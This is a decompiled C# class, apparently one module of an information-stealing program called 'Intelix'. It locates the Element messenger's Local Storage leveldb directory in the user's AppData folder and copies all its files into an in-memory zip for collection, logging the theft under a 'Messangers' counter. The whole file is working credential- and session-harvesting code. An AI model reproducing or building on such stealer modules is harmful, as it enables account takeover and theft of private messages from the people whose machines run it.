using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Messangers
{
	// Token: 0x02000018 RID: 24
	public class Element : ITarget
	{
		// Token: 0x06000049 RID: 73 RVA: 0x00003B00 File Offset: 0x00001D00
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Element\\Local Storage\\leveldb");
			bool flag = Directory.Exists(text);
			if (flag)
			{
				string text2 = "Element\\leveldb";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Element";
				zip.AddDirectoryFiles(text, text2, true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Messangers.Add(counterApplications);
			}
		}
	}
}
